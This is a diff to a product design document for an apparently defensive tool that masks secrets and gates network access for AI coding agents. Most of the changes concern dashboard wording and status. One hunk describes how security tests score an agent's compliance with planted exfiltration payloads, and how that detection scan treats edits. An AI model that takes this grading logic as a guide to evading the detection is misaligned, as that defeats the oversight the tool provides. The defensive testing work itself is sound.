@@ -246,6 +246,10 @@ interface ManduEvent {
             // key where the agent keeps no response id (same §)
             agentSessionId?: string };
   // …plus optional per-kind fields (fullInput §4.3.3, callShape §4.2c,
+  //   upstreamLimit: a tllm_call whose provider answered 429 / 529, what its
+  //   rate-limit headers said (status, claim, the 5h / 7d windows, reset,
+  //   Retry-After, `hard`; mandu.md §4.1 "Upstream throttles and plan
+  //   limits", §4.21 the product sentence),
   //   rewrite, launch posture, assertion checks, seed/final trees).
 }
 
@@ -2602,6 +2606,40 @@ stays on the API (`assertion-verdicts.test.ts`).
   `arbiter-source-sessions.test.ts`, and `session-list-exited.test.ts` (the
   served list and inspector over the tour record, moved to end a minute
   ago).
+- **A live launch keeps `R`** (2026-11-03). An agent emits nothing while
+  its person reads, thinks or answers a question on Approvals, so after
+  five quiet minutes the recency rule called a Claude Code session still
+  open in a terminal ended: Home moved it from *Running now* to *Earlier*,
+  History listed it ended, and its waiting question and rule change took
+  the words for a session that has ended (no "tell the agent to try
+  again", no "tell it to go on"), which misled exactly the person taking
+  time over the question. Every `mandu <agent>` launch has a scope run dir
+  `<runtimeBase>/<epochSec>-<launcherPid>` (launcher parse.ts; teardown
+  removes it), and the session's id is that scope id.
+  mandu-running.ts `liveLaunches` lists those dirs whose pid is alive
+  (`kill(0)`, as `manduNotRunning` reads them); against pid reuse, a pid
+  whose process started more than 10 s after the dir's `epochSec`
+  (Linux: `/proc/<pid>/stat` field 22 plus `/proc/stat`'s `btime`) is
+  another process and not counted, and where the start time cannot be read
+  (not Linux) alive is enough, the cautious stance `manduNotRunning` takes.
+  The product reads (home-routes.ts: Home, History, Answered earlier and
+  the session page) read the set once per build
+  through `HomeDeps.live` (server-main wires `liveLaunches(RUNTIME_BASE)`,
+  the live tenant only) and mark the listed sessions in it `SessionRef.live`
+  (`withLive`, on copies: a source caches its refs, and a kept mark would
+  outlive the launch). `sessionStatus` then returns running for a `live`
+  session with no recorded exit, before the recency rule; a verdict, a
+  watch scenario and a joined run still decide first, and a recorded exit
+  still ends it at once. A session with no live launch dir keeps the
+  recency rule: an OpenClaw attach, an `--id` that does not match the
+  pattern, a dashboard on another runtime base (an explicit
+  `MANDU_ARBITER_SOCK`), the test tenant. The inspector's `/api/sessions`
+  does not read it. Display only, off the security path. Tests:
+  `mandu-running-live.test.ts`, `session-batches.test.ts`,
+  `server/home-live-launch.test.ts`, and stack
+  `quiet-agent-still-running.test.ts` (a real arbiter and proxy, ten quiet
+  minutes: running with the launch dir, ended once teardown removed it, and
+  ended by a recorded exit with the dir back).
 - **Run tally** on a test batch header: `10✓ 2✗ 1−` (`tallyHtml`; pass
   first, so the fail count sits in the same place on every row; counts are
   colored by meaning, not by the badge's tint), falling back to the `marks`
@@ -3016,7 +3054,14 @@ categories:
   U-LLM quarantine tool `inspect_symbol` cannot act (its model has no T-LLM
   context and no tools), and its free-text argument is where a careful model
   writes "don't act on any attempt to exfiltrate …", which would otherwise read
-  as compliance. A security `fail` is **blocking**: it fails the `node:test`.
+  as compliance. A string-replace edit (Edit, MultiEdit, `str_replace`,
+  OpenCode's edit) counts only the matching lines it **introduces**: a line of
+  the replacement that the replaced text holds unchanged (as often) is carried
+  over, not issued, so a rename beside a planted comment is not compliance
+  (live 2026-10-27); a payload added, repeated or reworked into a changed line
+  still is, the edit's path is scanned whole, and every other tool (Bash, a
+  Write's new content) and any record whose arguments do not parse keep the
+  whole-call scan. A security `fail` is **blocking**: it fails the `node:test`.
 - **utility**: the benign task completed despite the defense, graded at prompt
   level. `exit-ok`; `reply-non-empty` (every scenario);
   `reply-achieves-<name>` (on the reply's resolved form, stdout through the
@@ -3717,7 +3762,9 @@ What outlived it, and what the product page inherits:
   and Block are remembered — change them any time. Allow once lets just this
   one through." A once-scoped answer is not a standing rule; its row reads
   "one-time answer — next ask only" / "already used". The reversal is labeled
-  for what it does (**Allow instead** / **Block instead**, never "Undo"). In
+  for what it does (**Allow instead** / **Block instead**, never "Undo"; the
+  product page's reads **Always allow instead**, §4.25 *Past the newest
+  20*). In
   the inspector: the Approvals page's "Waiting for your answer" cards
   (`#approvals-waiting`, egress.js `paintApprovalsWaiting`) and "Answered
   earlier" (§4.34), where the standing allow reads **Always allow**, as on
@@ -4068,7 +4115,7 @@ session, so everyday use doubles as a continuous test.
 | `relay_mode` | reply-filter | at its mode decision; again when its lookups start failing and when they answer again (reply-row-reservation.md §18) | `mode` (pty / pipe / passthrough) and the reason; `resolveFailure` (the error, no value) while the arbiter does not resolve |
 | `client_info` | anthropic-proxy | first request of a session | `userAgent`, `clientVersion` (`claude-cli/<v>`), `clientModel` |
 | `tool_surface` | anthropic-proxy | first request that carries a tool battery (the very first request is often a tool-less side call) | `names[]` advertised, `unknown[]` per the arbiter's `toolSurface` op |
-| `session_exit` | launcher | when the agent exits | `code`, `durationMs`; `discardedWrites[]` when the session changed a protected file's placeholder copy (the files by path, never content; the summary text shows them with control and format characters as `?`; shown in the `/dev/` inspector, not on the product page; confidentiality-plan-10-flow-taint.md §4.1) |
+| `session_exit` | launcher | when the agent exits | `code`, `durationMs`; `discardedWrites[]` when the session changed a protected file's placeholder copy (the files by path, never content; the summary text shows them with control and format characters as `?`; shown on the session page under *Changes Mandu did not apply to your files*, from a believed event only, §4.25b; confidentiality-plan-10-flow-taint.md §4.1) |
 
 The launcher builds `launch_posture` from the same banner lines a human sees
 (`launcher/src/services/observe.ts postureFindings`), classified with the
@@ -4147,12 +4194,13 @@ saw masked values (`$MDU:…`) in their terminal, or whose agent said
 "command not found" at every step, found a normal-looking row on Home and
 a normal session page. Now health carries `broken`, the causes behind a
 `broken` verdict as codes (`relay`, `relay-lookup`, `commands`,
-`no-turn`, `no-call`, pushed beside each developer reason), and the
+`no-turn`, `no-call`, `limit`, pushed beside each developer reason), and the
 product's warning (home.ts `agentNotice`, the ⚠ mark by the agent's name
 on Home's, Earlier's and History's rows and on its page) says them in the
-product's words, the most serious first: the broken causes, then commands
-that could not run, then the version or unknown-tools sentence it had
-before. Several apply: their sentences follow one another in that order.
+product's words, the most serious first: the broken causes, then the
+protections that did not start (2026-10-26, below), then commands that
+could not run, then the version or unknown-tools sentence it had before.
+Several apply: their sentences follow one another in that order.
 
 | health | the sentence |
 |---|---|
@@ -4160,7 +4208,37 @@ before. Several apply: their sentences follow one another in that order.
 | `commands` (N = the failed command runs) | None of the N commands the agent ran could start: a sandbox or a missing program stopped them. Run `mandu log <session>` for this launch's notices. (One: "The one command the agent ran could not start: … stopped it. …") |
 | `no-call` | The agent stopped before it finished a single turn: it exited with code N before its first request to the AI model. |
 | `no-turn` | The agent stopped before it finished a single turn. |
+| the AI provider's usage limit (`providerLimit`; `limit` when it came before any turn, 2026-10-28) | Your AI plan's usage limit was reached, so the AI model did not answer and the agent stopped. This limit is your AI provider's, not Mandu's. It resets Oct 29, 06:00. (The reset moment in the reader's own clock, the year only when it is not this year, the full date on hover: a `time` part home.js draws with `momentNode`, §4.25u; the plain `notice` keeps "It resets YYYY-MM-DD at HH:MM UTC.", as the hero link's `text` keeps UTC. After turns had flowed: "… did not answer some of the agent's requests. …"; with no reset known, the last sentence is left out.) |
+| a protection did not start (`droppedProtections` = N dropped lines, not the gated one) | N of Mandu's protections did not start in this session, so it ran with less protection than usual. Run `mandu log <session>` to see which, and `mandu doctor` to check this computer. |
 | some commands failed (degraded) | N of the commands the agent ran could not start. |
+
+The provider's usage limit is read off the model proxy's `tllm_call`
+`upstreamLimit` (a `hard` one: the plan's quota refused, mandu.md §4.1
+"Upstream throttles and plan limits"). Before any turn it is the cause
+(`limit` in place of `no-turn`): the session did not fail for Mandu's
+reasons, and the sentence says whose limit it is and when it lifts, in
+the product's words (no status code, no header names). A short throttle
+the proxy retried is no limit.
+
+When it lifts reads in the reader's own clock (2026-11-04). Until then the
+sentence said "It resets 2026-10-28 at 21:00 UTC.", the one moment on the
+product page in UTC and as a raw date, so a reader in Seoul had to add nine
+hours to learn the limit lifts at 06:00 the next morning. Now
+`agentNoticeParts` (view-model/home.ts) puts the provider's `resetsAt` in
+the notice's parts as a `{kind: 'time'}` part ("It resets ", the moment,
+"."), which `textParts` → `partNode` → `momentNode` draws as "Oct 29,
+06:00" with "Thursday, Oct 29, 2026, 06:00" on hover, on the Home and
+History rows' warning mark and the session page's warning line and mark
+(`HomeNoticePart`, the notice's own union; `HomeTextPart` is unchanged).
+The plain `agentNotice` string, a page without script and the terminal's
+and `mandu log`'s words keep UTC. Presentation only: the routes serve the
+same health. Tests: unit `home-view-model.test.ts` (one time part, no UTC
+in the drawn parts, the plain line unchanged, none without a reset time)
+and `home-js-limit-reset.test.ts` (Seoul: the row, the session page's line
+and mark draw `<time datetime=…>Oct 29, 06:00</time>`); component
+`limit-reset-time.test.ts` (the real server's `/api/home`,
+`/api/home/history` and `/api/home/agent` carry the part, signed in and
+out).
 
 The words keep the product's vocabulary (§4.25u): "masked values", never
 "placeholders" nor a token, and no "passthrough", "rung" or "symbol". A
@@ -4175,11 +4253,78 @@ from them. **A broken session's page writes it out**: `AgentPageVM.noticeShown`
 (health `broken` and a notice) draws the same words in an amber line under
 the header (`#agent-notice`, the look of the gated-launch line, under the
 title "This session did not work as it should."), not only behind the
-mark; a degraded session's stays behind the mark. Presentation only, over
-events already recorded: an old session's warning gains the sentence too.
+mark; so does a session where a protection did not start (below, under
+its own title); any
+other degraded session's (some commands failed, the version) stays behind
+the mark. Presentation only, over events already recorded: an old
+session's warning gains the sentence too.
+
+*A protection that did not start (2026-10-26).* A launch that goes on
+without a protection that is on by default (a service that failed to
+start, a degraded confinement, a kernel layer it proceeds without) prints
+one `mandu: WARNING: …` line, gone once the window closes; the launcher
+records it in `launch_posture.dropped` (observe.ts `postureFindings`).
+Until this change only the chip graded it, so Home, History and the
+session page showed such a session as fully protected. Health now counts
+them (`droppedProtections`, absent at 0) and the warning says how many,
+never the line itself: a line may name paths, ports or developer terms,
+and only the count and fixed words reach the page. It is a
+protection-status fact, not a display glitch, so `noticeShown` is true for
+`broken` **or** a counted line. The line's title says which
+(`AgentPageVM.noticeTitle`, 2026-10-27): a broken session, dropped lines or
+not, keeps "This session did not work as it should." (the bigger news); a
+session that is not broken but lost a protection reads "This session ran
+with less protection than usual.", since its agent worked and the old title
+claimed a failure that did not happen. `noticeTitle` is null when
+`noticeShown` is false; home.js falls back to the broken title when an
+older server sends none. The sentences and the mark are unchanged.
+**The rows say it too** (2026-10-27, nightly #199). Until then Home's
+Running now and Earlier rows and History's rows had the fact only behind
+the ⚠ button, in `notice` beside the version and unknown-tools warnings:
+a running agent that lost a protection had the green dot of a fully
+protected one. Now the row carries `lessProtection: true`
+(`droppedProtections > 0`, `homeAgentRow`, shared by the three lists; left
+out otherwise, since a `false` on every row of the polled `/api/home` would
+take it over its budget, §4.30 *Payload budgets*), its
+counts line says "less protection than usual" after "protection failed"
+and "protection was off" (home.js `rowMarks`), and its dot is amber unless
+protection failed (red). The ⚠ button keeps its full sentence. A boolean
+only: no launch-line words reach the row. A session still running is
+named in Home's calm hero too (2026-10-27, #222), and in its `waiting`
+hero after the verdict's own sentence (2026-11-03, #292; §4.25, *A running
+agent with less protection than usual*); an ended one is left to its row.
+History's *Find a session* is unchanged (§4.25). Its switch *Only
+sessions where Mandu stepped in* keeps such a session since 2026-11-04
+(Shoemaker #267, §4.25ae; until then it was unchanged too). Not counted:
+
+- the `secrets are GATED` line while the posture is `gated`: the posture
+  note (§4.23 *Product page*) says it;
+- "could not inherit workspace/directory trust for the AgentView twin": no
+  protection, the agent may only ask its trust question once (the chip
+  still grades it);
+- off Linux, a line about a Linux-only layer's absence (bubblewrap,
+  Landlock, the connect guard, in the older "… not built … proceeding
+  WITHOUT it" wording or the newer "Linux only"): that layer is not part of
+  the platform's protection, the call `mandu doctor` makes
+  (doctor-live.ts `isLinuxOnlyRungLine`). The dashboard keeps a display
+  copy (`linux-only-rung.ts`; it does not import the launcher), and its
+  callers pass `process.platform` to `deriveHealth` (without one every line
+  counts). A Seatbelt or `sandbox-exec` failure is a real drop.
+
+No dropped line is printed by every normal Linux launch (the recorded
+tour launch has none), so a healthy host shows nothing. A forged (claimed)
+posture record can only add a count with fixed words, and `deriveHealth`
+prefers the believed record, so it cannot hide a real drop. Unit
+`session-health.test.ts` (the count, the exclusions, the platforms),
+`home-view-model.test.ts` (the sentence, its place, the vocabulary),
+`agent-page.test.ts`, jsdom `home-js-home.test.ts` and
+`home-js-agent.test.ts`; stack `product-session-notice.test.ts` (a real
+launcher line through `launchPostureEvent`; neither payload carries its
+words) and `linux-only-rung-parity.test.ts` (the copy answers as the
+launcher over real lines in both wordings).
 Unit `session-health.test.ts` (the codes), `home-view-model.test.ts`
 (each case from `deriveHealth` over events, the order, the vocabulary),
-`agent-page.test.ts` (`noticeShown`), jsdom `home-js-home.test.ts` and
+`agent-page.test.ts` (`noticeShown`, `noticeTitle`), jsdom `home-js-home.test.ts` and
 `home-js-agent.test.ts`; stack `product-session-notice.test.ts` (the real
 anthropic-proxy on its production wiring, the launcher's posture event, a
 reply-filter passthrough record, `/api/home` and `/api/home/agent` signed
@@ -4707,9 +4852,19 @@ so, in the same words as the launch notice and `mandu doctor`.
   `launch_posture` (first-class, no banner parsing). `session-health.ts`
   lifts it to `SessionHealth.secrets` with one honest `sentence` and, where
   the gap has one, the `fix` command (`mandu setup` for `apparmor-userns`,
-  `sudo apt install bubblewrap` for `no-bwrap`). The sentences mirror
-  `launcher/src/confinement-posture.ts`; a parity unit test loads the
-  launcher module and holds them equal.
+  `sudo apt install bubblewrap` for `no-bwrap`). Since 2026-10-25 the
+  sentences, fixes and partial-layer notes are not a hand mirror:
+  `dashboard/src/confinement-posture.ts` is a byte-for-byte copy of
+  `launcher/src/confinement-posture.ts` (`scripts/copies/module-copies.mjs`;
+  the arbiter holds a third copy), and `session-health.ts` reads them from
+  it. A gap may carry a sentence of its own (`postureSentence`): the
+  OpenClaw plugin's `openclaw-plugin` (openclaw-plugin.md §3.4) says what
+  it does not cover instead of `gated`'s egress promise.
+- **Which record.** The first BELIEVED `launch_posture` wins over a claimed
+  one (arbiter-human-plane.md §10.2), so a forgery written first on the
+  data socket cannot stand in for an attachment's posture, which the
+  arbiter records itself at `beginAttachment`; a session whose every
+  record is a claim (an unwalled launch's) keeps its first, as before.
 - **Verdict.** `gated` is a known host condition, not an incident: it makes
   the §4.21 verdict **degraded (amber)**, never **broken (red)**, with one
   plain reason.
@@ -4736,9 +4891,13 @@ so, in the same words as the launch notice and `mandu doctor`.
     the one started last (`firstTs`). Home draws it under the headline, after
     the exposure card (§4.25x): "Programs your agent runs can still read
     your credential files.", the posture's own sentence (the launcher's
-    words, as the terminal and `mandu doctor` say them, so it keeps their
-    "placeholders"), the partial-layer note for a `no-guard` / `guard-off`
-    gap (`SECRETS_PARTIAL_NOTE`), and, only where the gap has one, the fix
+    words, as the terminal and `mandu doctor` say them; since 2026-10-27 in
+    the product's vocabulary, §4.25u: "The AI sees your secrets masked and a
+    secret is sent out only where a rule or your OK allows, but programs the
+    AI runs can still read your credential files."), the partial-layer note
+    for a `no-guard` / `guard-off` gap (`SECRETS_PARTIAL_NOTE`: "The mount
+    layer still puts a masked copy over each credential file, but …"), and,
+    only where the gap has one, the fix
     as a command: "Run `mandu setup` in a terminal once, then start your
     agent again." (`fixParts`, the command a code part).
   - **A session's page.** `AgentPageVM.secretsPosture` is the session's own
@@ -4866,6 +5025,79 @@ jsdom at 1280, 390 and 320 px) and `tests/stack/product-link-width.test.ts`
 against its words' box, a click 200 px right of "Back to home" stays on the
 page, a click on its words goes Home; no value on the page).
 
+**The top bar's two marks (2026-10-25).** The Approvals link carries the
+count of what waits for your answer (`#nav-approvals-count`, an amber
+pill, set in `renderTopStatus`: the questions plus the rule changes your
+agent asked for). The Rules link carries its own mark while levels you
+chose on Rules wait to be saved (`#nav-rules-unsaved`, §4.25n *The top bar
+says when Rules has changes not saved*). The two differ in style on
+purpose: the count asks for an answer, the Rules mark only says a choice of
+yours is not in force yet. So the mark is a ring in the link's own ink,
+with no fill, never the amber, and the two never read as one count.
+
+Both links say in words what their mark counts (2026-10-26, #206). While
+anything waits, the Approvals link's accessible name and title read
+"Approvals, 1 waiting for your answer" / "Approvals, 2 waiting for your
+answer", as the Rules link's read "Rules, 2 changes not saved"; with
+nothing waiting (the pill hidden, a failed home read included) both are
+removed and the link reads "Approvals". Before, a screen reader named the
+link from its text, "Approvals 2", a bare number with no word for what it
+counts, and a hover gave no title. The count is the pill's own (the
+questions plus the rule changes your agent asked for), the words those of
+the live region's "… 2 waiting in Approvals." (*A new question is
+announced on the page*), and the name starts with "Approvals" so voice
+control ("click Approvals") still finds the link. `renderTopStatus` writes
+them only when the count changed (`sameAsDrawn('approvals-mark')`), never
+every poll. Nothing changes on screen. Tests:
+`home-js-waiting-line.test.ts` (N1 to N5) and
+`tests/stack/announce-new-asks.test.ts` (A2, A3: the link's name over the
+real gate; A4: its name and title carry no token, secret, host or reason).
+
+The Approvals count has a quiet state (2026-10-28, #227). While every
+question it counts is from a session that has ended (`askerEnded`, *A
+question from a session that has ended*) and no rule change waits, the
+hero's own rule (`allEnded`), the pill shows the same number in grey
+(class `ended`: `--ink-4` fill, `--panel` ink, 5.3:1 light and 5.6:1 dark,
+its fill 3:1 at the least on the current link's `--line`). It stays a
+filled pill of the same size, never the Rules link's ring, so the nav's
+room is unchanged. The link's name and title read "Approvals, 1 question
+from a session that has ended, no agent is waiting on it" / "Approvals, 2
+questions from sessions that have ended, no agent is waiting on them".
+One live question or any rule change brings back the amber and the name
+above, still counting everything. Before, a question left unanswered when
+its session ended kept an amber count on every page, the product's one
+signal that something is held up until you answer, while the hero under it
+said no agent was waiting. The number, the tab title's "(N)", the number on
+the tab icon's dot, the notifications and Home's "Approvals waiting (N)" are
+unchanged; since 2026-10-31 the colour of that dot follows the grey too
+(*The tab says the protection state*), from the same test
+(`nothingHeldUp` in `home.js`, which `renderTopStatus` and `renderTitle`
+both call, so the bar and the tab never disagree).
+`sameAsDrawn('approvals-mark')` keys on the count and the grey, so a live
+question whose session ends renames the link at the same count. Tests:
+`home-js-waiting-line.test.ts` (Q1 to Q6),
+`tests/stack/home-waiting-verdict.test.ts` (E2, E3: over a real
+`session_exit`, the grey and the name, which carries no token, key name or
+host) and the developer view's stack test of the badge's colors (B4: both
+themes, on Home and on Approvals).
+
+The Rules slot has a second state (2026-10-27, #215): while Mandu refuses
+your last edit to policy.yaml it shows "!" in a warn ring
+(`.unsaved-mark.refused`: the `--warn` ink and edge, still no fill, so it
+never reads as the Approvals count's amber pill), and the link's name says
+so (*An edit to policy.yaml Mandu refused*, *The top bar says so on every
+page*). The refusal wins the slot over the count of changes not saved: a
+Save from Rules writes that same file, so the refusal is what to fix first;
+the count stays in the link's name and title. The nav's room does not
+change: "!" is narrower than a digit, and the ring is at least a one-digit
+ring wide (`min-width: 17px`, "!" centred), so it needs exactly what "9"
+needs (`css-nav-fits.test.ts` F10). Its "!" reads 5.44:1 (light) and 7.58:1
+(dark) on the bar, 4.75 and 6.27 on a hovered link. On the current page
+(Rules itself) the warn reads only 4.13:1 on the light ground, under AA for
+12 px text, so there the "!" takes the link's ink and the ring keeps the
+warn (3:1 for an edge). Under forced colors both are drawn in the link's
+color, as the ring of changes not saved is.
+
 **The top bar says on or off (2026-10-15).** The status read "Protection:
 Secrets", a level name, when the product ships one level and its Settings
 switch says on or off. It now says what the switch says
@@ -4875,13 +5107,34 @@ switch says on or off. It now says what the switch says
 |---|---|
 | any level that protects (`secrets`; a frozen one too) | green dot, **Protection on** |
 | `off` | amber dot, **Protection off** |
-| `unknown` (no protection service) | grey dot, **Protection unknown** |
+| `unknown`, no protection service (the server answered) | grey dot, **Not connected** (since 2026-10-28) |
+| `unknown` from a service that answers without its level (one older than posture reporting) | grey dot, **Protection unknown** |
 | no answer from the server | red dot, **Not connected** |
+| the hero's verdict is `failed` (since 2026-10-23) | red dot, **Protection failed**, a link to where it happened |
 
 A change saved for the next start adds "· off from the next start" or
 "· on from the next start". A change between two levels that protect adds
 nothing. `home-js-top-status.test.ts` pins each row and sweeps every pair
 for a level name. The developer view's own top bar still names the level.
+
+*No protection service says "Not connected" (2026-10-28).* Until then the
+grey state read **Protection unknown** while the hero said "Not connected."
+and the tab "Not connected" for the same home, so a person read two names
+for one state and could not tell whether these were two problems. With no
+protection service (`connected: false`, the hero's verdict `unknown`) the
+bar now says **Not connected**, as the hero and the tab do, with the grey
+dot it had; a failed read keeps its red one, as the hero keeps one headline
+for both. Only a service that answers but does not report its level is still
+**Protection unknown**: it is connected, and the hero does not say it is
+not. The words stay one link to Settings ("Not connected: open Settings");
+Settings' Protection row keeps its own sentence. "Not connected" (102 px) is
+narrower than "Protection unknown" (132), which the bar can still show, so
+the fit figures below stand. Tests: `home-js-top-status.test.ts` (both
+dots, the link's name, the hero, the tab and the bar for one home), the
+served page with no protection service in the developer view's
+`protection-running` component test, and
+`tests/stack/product-service-down-refusals` (the arbiter stopped: the bar,
+the hero and the tab say "Not connected").
 
 *Its words lead to the switch (2026-10-18).* The top bar is the one
 protection signal on every page, and until 2026-10-18 it led nowhere: on
@@ -4913,10 +5166,59 @@ the link's name, Approvals' intro) and `tests/stack/top-status-opens-protection`
 390 px the click lands on the focused switch, the bar still fits from 641 px,
 and at 375 px with a request waiting the page links still fit their row).
 
+*It says when protection failed (2026-10-23).* When something reached the
+AI unmasked, Home's hero said "Protection failed." and the tab said it too
+(*The tab says the protection state*), but the top bar read only the level,
+so every other page (Rules, Approvals, History, Settings, a session page)
+showed a green dot and **Protection on**. A person at work on Rules or
+Approvals had no sign of the leak unless they went back to Home, and a
+notification is shown once. Now, while the hero's verdict is `failed`, the
+top bar on every page shows a red dot and **Protection failed**, as a
+`.top-status-link` in the status's own ink and size (`failedLink`). With one
+failed session it opens that session's product page, where *What the leak
+check found* is ("Protection failed: open the session where it happened");
+`failedAt` reads the session from the hero's own link part, `agent` in the
+product build or `trace` in the developer one, so both builds link the
+product page. With several it opens Home, whose hero and rows say which
+("Protection failed: open Home"): `failedAt` links a session only when the
+hero's `agent`/`trace` links name exactly one, and Home otherwise (the
+developer build's trace list names none; the product build has named each
+failed session since 2026-10-25, *Protection failed in several sessions*).
+It counts every such link of the `failed` sentence, so a hero that adds
+other `agent` links to it (as the calm verdicts name a running agent with
+less protection) must keep them apart, say by marking the failed ones. A plain click opens it
+in place (`wireNav`); a modifier click is the browser's. `failed` wins over
+off and over a change saved for the next start (no tail is drawn), as the
+hero's ladder ranks it; not running and no answer keep their words, as the
+ladder ranks them first. Nothing new comes from the server: the verdict and
+`sentenceParts` are in every Home poll. The live region is still written
+only when its words change: the `sameAsDrawn` key gains whether the verdict
+is `failed` and the session it links, not the verdict itself, so a change
+between two verdicts that protect does not say "Protection on" again. The
+words measure 113 px in Chromium with their dot (`nav-row.ts`), less than
+"Protection unknown"'s 132, so the bar still fits. Tests:
+`home-js-top-status.test.ts` (one session in either build, several, the tail
+and off, not running and no answer, an identical poll, back to on) and
+`tests/stack/top-status-failed` (real arbiter, proxy and product dashboard, a
+Read the leak check flagged: on Rules at 1280 and 390 px the link leads to
+that session's page and a click opens its finding; the bar fits at 320 to
+1280 px; no text, name or address carries the value or a token).
+*Several again opens Home (2026-11-03, #305).* Once the product hero named
+each failed session (2026-10-25), `failedAt` took the first of its links,
+so with two or more the top bar opened only the newest and told a screen
+reader it was "the session where it happened"; Home and the others were not
+reached from it. It now counts the distinct sessions the links name, as
+above. Tests: `home-js-top-status.test.ts` (several as the server words it
+today, two and three with "and 2 more", the developer build's list; a poll
+from one session to two and back redraws the link) and
+`tests/stack/home-failed-sessions.test.ts` H2 (the served Home with two
+failed sessions: the top bar opens Home, and still does from a failed
+session's page).
+
 **The projection: one GET.** The product page is fed by server projections,
 never by the inspector's client. `GET /api/home` (`server/home-routes.ts`)
-composes what Home needs so the page makes one fetch per poll (10 s, visible
-tab only):
+composes what Home needs so the page makes one fetch per poll (10 s, also
+in a background tab, §4.25 *A background tab keeps reading*):
 
 - the session list split by `session-batches`; the product shows **Live**
   only (a drill or e2e session is never someone's work; those stay in the
@@ -4950,7 +5252,24 @@ tab only):
   (masking on, nothing untrusted yet) > `protected`. Each carries a headline
   and one sentence; the page never composes copy from counts. The place a
   sentence sends the person is a link (*The hero links where it points*,
-  below): `off` says "Turn it back on in Settings", where the switch is. Until
+  below): `off` says "Turn it back on in Settings", where the switch is,
+  after "Your keys and secret files reach the AI as they are, and nothing
+  stops them leaving this computer." It names what off costs (secrets
+  unmasked, nothing stopped), never untrusted content: until 2026-10-27 it
+  began "The AI can read untrusted content as-is", which is as true of the
+  Secrets mode the switch brings back, so it promised masking that turning
+  protection on does not give. The first-run card's off sentence says the
+  same ("Protection is off, so Mandu only watches: keys and secret files
+  reach the AI as they are, and nothing stops them leaving this computer.
+  Turn it on in Settings › Protection."; until then "your secrets are not
+  guarded and untrusted content is not masked"). Tests:
+  `home-view-model.test.ts` (neither sentence says "untrusted"),
+  `home-js-home.test.ts`, `tests/stack/home-hero-links.test.ts`;
+  while On is saved for the next start (the saved mode turns the secrets
+  axis on, `secrets` or `full`; a saved `injection` does not count) it
+  says what is left to do instead, "On is saved and starts when the
+  protection service restarts. Open Settings › Protection." (*The hero
+  links where it points*, below). Until
   2026-10-07 the `waiting` sentence went on "Nothing leaves your machine
   until you answer.", at every level. A rule sends a secret to its own host
   while a question waits (§4.25d), most asks are not sends (a program's
@@ -4962,6 +5281,109 @@ tab only):
   `home-view-model.test.ts` (each family, Secrets and the frozen levels) and,
   over a real arbiter whose gate lets the secret go to its bound host while
   a question about it waits, `tests/stack/home-waiting-verdict.test.ts`.
+- **Protection failed in several sessions** (2026-10-22, built
+  2026-10-25). In the build without the developer view (§4.25ad) the
+  `failed` sentence for two or more sessions said only "Each agent where it
+  happened says "protection failed" below, and its page shows which.": no
+  session was named, nothing was a link, and "below" was not always true,
+  since Earlier drew only its first ten ended sessions. Now it names where
+  it happened, each place a link to that session's page (`to: "agent"`,
+  as the one-session link is): "3 items reached the AI unmasked in the
+  last 24 hours, in Claude Code in `~/shop` and Codex CLI in `~/api`. Open
+  each to see which." (home.ts `failedSessionParts`). Each place is the
+  row's agent and folder (`~/…` under the dashboard's home, as the rows and
+  an ask's "from Claude Code in ~/projects/shop" write it; the agent alone
+  for a session with no folder), newest first, three at most, then "and 2
+  more, each marked "protection failed" in the lists below". Two places
+  named alike are told apart by when they ended ("…, ended Oct 25, 14:02",
+  or "started" for one still running): the link's `parts` carry the folder
+  as code (the page breaks a long one at its slashes, `nameCode`) and the
+  moment as a `time` part the page draws in the reader's clock; its plain
+  `text` says the moment in UTC. A window not wholly counted
+  (`window.counted < window.sessions`) says "at least in", since a session
+  left out may have failed too. The words are agent names and folders
+  only, from the `home.agents` rows the view model already builds: no
+  value, no token, nothing new from the server. One failed session keeps
+  "Open that agent's page to see which.", and the developer-view build its
+  trace link. Earlier never cuts a failed row (§4.25ad), so "the lists
+  below" holds. Tests: `home-failed-names.test.ts` (the words, the order,
+  the cut at three, the moment, no folder, "at least", the one-session and
+  developer cases, the oracle), `agent-page-show.test.ts`,
+  `home-js-home.test.ts` (the links drawn, the folder as code, the moment;
+  Earlier's failed eleventh row) and, across the real arbiter and a
+  product-only dashboard, `tests/stack/home-failed-sessions.test.ts` (two
+  failed sessions behind eleven newer clean ones: the hero names both and
+  each link opens its page, both rows are on Home without Show them, and no
+  hero text, title or href carries the value or a token). The top bar's
+  **Protection failed** opens Home in this case, not one of the named
+  sessions (*It says when protection failed*, 2026-11-03).
+- **A running agent with less protection than usual** (2026-10-27,
+  #222). The calm verdicts' sentence counted only running agents ("One
+  agent is running under Mandu. Keys and secret files leave …"), so with
+  the agent you watch running without, say, its network egress proxy
+  (§4.21 *A protection that did not start*), the hero read as if every
+  agent had all of its protections; only its row said otherwise (#199).
+  Now, at `secrets-only`, `quiet` and `protected`, the running or waiting
+  rows with `lessProtection` are named right after the running phrase,
+  each a link to its page, named as *Protection failed in several
+  sessions* names them (the shared `namedSessionParts`: agent and folder
+  as code, newest first, two alike told apart by when they started, three
+  at most): "One agent is running under Mandu. Claude Code in `~/shop`
+  runs with less protection than usual: not all of Mandu's protections
+  started for it. Keys and secret files leave …"; several "… and Codex
+  CLI run with less protection than usual: not all of Mandu's protections
+  started for each."; past three "… and N more, each marked in Running now
+  below, run …" (home.ts `lessProtectionParts`). "Not all", never "one
+  of": the row carries a boolean, and a launch can lose more than one. The
+  headline, the verdict, its icon and the counts stay as the level makes
+  them: like `secretsPosture`, a per-session condition is said in the
+  sentence, not by regrading the level. `waiting` names them too
+  (2026-11-03, #292), after its own sentence (and after "Untrusted content
+  is not masked in this mode."), in each of its forms (questions, rule
+  changes, both, and questions only from ended sessions): "One question is
+  waiting for you. Protection is holding while you decide: … Untrusted
+  content is not masked in this mode. Claude Code in `~/shop` runs with
+  less protection than usual: not all of Mandu's protections started for
+  it." The agent most likely asking is the one running now, and `waiting`
+  is the verdict read most while an agent runs; its headline, icon and
+  counts stay. `failed`, `off` and `unknown` keep their sentences (their
+  own louder news; the row's mark still says it), and an ended session is
+  left to its row. Agent
+  names, folders and fixed words only, never the launch line. home.js is
+  unchanged (`placeLink` draws the links; the hero's redraw key holds
+  `sentenceParts`). Tests: `home-failed-names.test.ts` (one, two, four,
+  the alike moment, an ended one, each verdict, `waiting` in its plain and
+  all-ended forms, the oracle over the calm and waiting forms),
+  `home-js-home.test.ts` (the link drawn, its href, the folder as code)
+  and, across the real components, `tests/stack/product-session-notice.test.ts`
+  (N5: the still-running session whose network proxy did not start is the
+  hero's only link, signed in and out, at `secrets-only` and again once a
+  real held send puts Home at `waiting`).
